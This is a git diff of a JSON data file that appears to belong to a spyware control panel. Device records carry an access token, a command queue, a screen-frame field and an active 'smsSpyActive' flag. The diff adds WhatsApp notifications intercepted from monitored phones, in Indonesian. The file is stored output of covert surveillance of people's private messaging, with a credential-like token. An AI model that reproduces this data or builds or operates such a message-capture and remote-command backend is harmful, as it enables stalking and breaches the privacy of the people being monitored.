@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775039967328,
+    "lastSeen": 1775039970217,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14402 pesan dari 11 chat",
+        "time": "01/04 18:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775039970658
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12064 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 18:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775039970477
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -1545,6 +1561,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14402 pesan dari 11 chat",
+        "time": "01/04 18:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775039970639
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (12064 pesan): ~ Bot",
+        "content": "💟 Stiker",
+        "time": "01/04 18:39",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775039970482
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
